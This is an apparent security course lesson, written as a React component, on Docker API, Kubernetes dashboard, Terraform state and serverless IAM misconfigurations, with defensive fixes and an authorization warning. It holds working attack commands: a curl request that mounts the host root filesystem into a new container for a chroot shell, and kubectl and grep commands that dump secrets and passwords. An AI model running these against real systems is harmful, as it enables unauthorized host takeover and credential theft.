import CodeBlock from '../../components/lesson/CodeBlock';
import Callout from '../../components/lesson/Callout';

export default function ContainersAndIacSecrets() {
  return (
    <div className="prose-hh">
      <h1>Container, Kubernetes &amp; Infrastructure-as-Code Security</h1>
      <p>
        The first two lessons covered storage and identity. This one covers the layer most modern cloud
        workloads actually run on — containers and the orchestrators that manage them — plus the
        infrastructure-as-code files that provision all of it, which routinely end up holding real secrets
        in plaintext.
      </p>

      <h2>The unauthenticated Docker API: full host takeover, no exploit required</h2>
      <p>
        Docker's own management API, when exposed on its default port with no authentication in front of
        it, gives anyone who can reach it complete control — not just over containers, but effectively over
        the host itself, since a container can be started with the host's filesystem mounted directly
        inside it.
      </p>
      <CodeBlock label="why an exposed Docker API means full host compromise">{`# Just checking what's running requires no exploit at all:
curl http://target:2375/containers/json

# The actual escalation: start a new container with the HOST's root filesystem mounted inside it
curl -X POST http://target:2375/containers/create -d '{
  "Image": "alpine",
  "Cmd": ["chroot", "/host", "sh"],
  "HostConfig": { "Binds": ["/:/host"] }
}'
# Anything run inside that container now reads/writes the REAL host filesystem — this is not
# "container access," it is unauthenticated root on the underlying machine.`}</CodeBlock>
      <Callout variant="danger">
        <p>
          This is not a hypothetical — internet-wide scanning for exposed Docker APIs on port 2375 is
          constant and automated; unauthenticated instances are typically compromised within minutes of
          going online, usually for cryptomining.
        </p>
      </Callout>

      <h2>The Kubernetes dashboard: the same problem, at cluster scale</h2>
      <p>
        A Kubernetes dashboard exposed without authentication (or with a token bound to an
        over-permissioned service account) gives an attacker the same kind of control the Docker API does,
        except across an entire cluster of workloads instead of one host — including the ability to
        schedule new pods, which is the cluster-native equivalent of "start a container with the host
        mounted in."
      </p>
      <CodeBlock label="what an exposed dashboard reveals immediately">{`kubectl get pods --all-namespaces           # see every workload running in the cluster
kubectl get secrets --all-namespaces          # Kubernetes Secrets are base64-ENCODED, not encrypted —
                                               # trivially reversible the same way HTTP Basic Auth is
kubectl get pods -o yaml | grep -i "image:"    # confirm exactly what's deployed, useful for finding
                                                # an outdated/vulnerable image to target next`}</CodeBlock>
      <p>
        That "base64-encoded, not encrypted" detail about Kubernetes Secrets is worth remembering on its
        own — it's a frequent source of a false sense of security, exactly the same category of mistake as
        treating HTTP Basic Auth as if base64 provided real protection.
      </p>

      <h2>Infrastructure-as-code: when the blueprint itself leaks the keys</h2>
      <p>
        Terraform, CloudFormation, and similar tools describe cloud infrastructure as version-controlled
        text files — which means any secret hardcoded into one of those files (instead of pulled from a
        proper secrets manager at deploy time) sits in plaintext in source control, and often in the
        resulting Terraform <strong>state file</strong> as well, whether or not the original template
        author intended it to.
      </p>
      <CodeBlock label="why the STATE file leaks secrets even when the template looks clean">{`# main.tf might look perfectly reasonable:
resource "aws_db_instance" "app" {
  password = var.db_password   # pulled from a variable, not hardcoded — looks safe
}

# ...but terraform.tfstate, the file Terraform uses to track what it deployed, stores the
# FULLY RESOLVED value of every attribute, including that password, in plaintext JSON:
grep -A2 '"password"' terraform.tfstate
#   "password": "Pr0d-DB-P@ssw0rd-2026"`}</CodeBlock>
      <p>
        This is precisely why Terraform's own documentation insists the state file be treated as sensitive
        and stored in an access-controlled remote backend (encrypted S3 bucket + DynamoDB lock, or
        Terraform Cloud) — never committed to a public repository, and never left readable on a build
        server's local disk after a CI job finishes.
      </p>

      <h2>Serverless functions: least privilege for code you don't manage the runtime of</h2>
      <p>
        A serverless function (AWS Lambda, Azure Functions, Google Cloud Functions) runs with whatever IAM
        role is attached to it — and because there's no server to patch or harden, teams often
        under-invest in scoping that role correctly, on the assumption that "serverless" means "less to
        secure." The opposite is true for IAM specifically: the function's role is the entire security
        boundary, since there's no OS-level access control layer underneath it at all.
      </p>
      <CodeBlock label="an over-permissioned function role, and the fix">{`// A function that only needs to write to ONE queue, but was attached this role:
{ "Effect": "Allow", "Action": "sqs:*", "Resource": "*" }
// -> if the function code has any injection flaw, the attacker inherits read/write/delete
//    across every SQS queue in the account, not just the one the function actually uses

// Scoped correctly:
{ "Effect": "Allow", "Action": "sqs:SendMessage", "Resource": "arn:aws:sqs:us-east-1:123456789:app-queue" }`}</CodeBlock>

      <Callout variant="tip">
        <p>
          The pattern across every example in this lesson is the same one the IAM lesson introduced:
          something that's supposed to be internal-only (a management API, a dashboard, a state file, a
          function's permissions) ends up broader or more exposed than intended. Auditing cloud security
          is largely the discipline of finding every place that pattern repeats.
        </p>
      </Callout>

      <Callout variant="danger">
        <p>
          Scanning for exposed Docker APIs, Kubernetes dashboards, or attempting to read another
          organization's Terraform state requires the same explicit authorization any other security
          testing does — these are real, high-impact compromise paths, not a lower-stakes category just
          because the target is "infrastructure" rather than an application.
        </p>
      </Callout>

      <h2>Module complete</h2>
      <p>
        You now have the full cloud misconfiguration picture this course covers: storage and metadata-service
        exposure, IAM and least-privilege failures, and the container/orchestration/infrastructure-as-code
        layer underneath all of it — the same three categories responsible for the overwhelming majority of
        real-world cloud security incidents.
      </p>
    </div>
  );
}
